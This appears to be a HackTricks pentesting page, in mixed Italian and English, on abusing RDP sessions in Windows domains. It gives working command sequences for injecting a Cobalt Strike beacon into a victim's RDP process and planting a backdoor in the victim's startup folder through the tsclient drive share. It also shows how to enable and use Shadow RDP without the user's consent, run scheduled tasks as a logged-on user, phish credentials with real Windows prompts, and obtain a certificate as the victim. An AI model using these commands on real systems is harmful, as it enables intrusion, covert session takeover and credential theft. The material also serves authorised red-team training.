# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Se il **external group** ha **RDP access** a qualsiasi **computer** nel dominio corrente, un **attacker** potrebbe **compromise that computer and wait for him**.

Una volta che quell'utente si è connesso via RDP, il **attacker can pivot to that users session** e può abusare dei suoi permessi nel dominio esterno.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Vedi **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Se un utente accede via **RDP into a machine** dove un **attacker** lo sta **waiting**, l'**attacker** sarà in grado di **inject a beacon in the RDP session of the user** e, se il **victim mounted his drive** durante l'accesso via RDP, il **attacker could access it**.

In questo caso puoi semplicemente **compromise** il **victims** **original computer** scrivendo un **backdoor** nella **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Se sei **local admin** su un host dove la vittima ha già una **active RDP session**, potresti essere in grado di **visualizzare/controllare quel desktop senza rubare la password o eseguire il dump di LSASS**.

Questo dipende dalla policy **Remote Desktop Services shadowing** memorizzata in:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Valori interessanti:

- `0`: Disabilitato
- `1`: `EnableInputNotify` (controllo, è richiesta approvazione dell'utente)
- `2`: `EnableInputNoNotify` (controllo, **nessuna approvazione dell'utente**)
- `3`: `EnableNoInputNotify` (solo visualizzazione, è richiesta approvazione dell'utente)
- `4`: `EnableNoInputNoNotify` (solo visualizzazione, **nessuna approvazione dell'utente**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Questo è particolarmente utile quando un utente privilegiato connesso via RDP ha lasciato il desktop sbloccato, una sessione KeePass, la console MMC, una browser session o un admin shell aperti.

## Scheduled Tasks As Logged-On User

Se sei **local admin** e l'utente target è **attualmente connesso**, Task Scheduler può avviare codice **come quell'utente senza la sua password**.

Questo trasforma la sessione di accesso esistente della vittima in una primitiva di esecuzione:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Note:

- Se l'utente **non ha effettuato il logon**, Windows di solito richiede la password per creare un task che venga eseguito come lui.
- Se l'utente **ha effettuato il logon**, il task può riutilizzare il contesto di logon esistente.
- Questo è un modo pratico per eseguire azioni GUI o avviare binari all'interno della sessione della vittima senza toccare LSASS.

## CredUI Prompt Abuse From the Victim Session

Una volta in grado di eseguire **all'interno del desktop interattivo della vittima** (per esempio tramite **Shadow RDP** o **a scheduled task running as that user**), puoi mostrare un **vero Windows credential prompt** usando le API CredUI e raccogliere le credenziali inserite dalla vittima.

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typical flow:

1. Spawn a binary in the victim session.
2. Display a domain-authentication prompt that matches the current domain branding.
3. Unpack the returned auth buffer.
4. Validate the provided credentials and optionally keep prompting until valid credentials are entered.

This is useful for **on-host phishing** because the prompt is rendered by standard Windows APIs instead of a fake HTML form.

## Requesting a PFX In the Victim Context

La stessa primitiva **scheduled-task-as-user** può essere usata per richiedere un **certificate/PFX as the logged-on victim**. Quel certificato può poi essere usato per **AD authentication** come quell'utente, evitando del tutto il furto della password.

High-level flow:

1. Gain **local admin** on a host where the victim is logged on.
2. Run enrollment/export logic as the victim using a **scheduled task**.
3. Export the resulting **PFX**.
4. Use the PFX for PKINIT / certificate-based AD authentication.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## Riferimenti

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
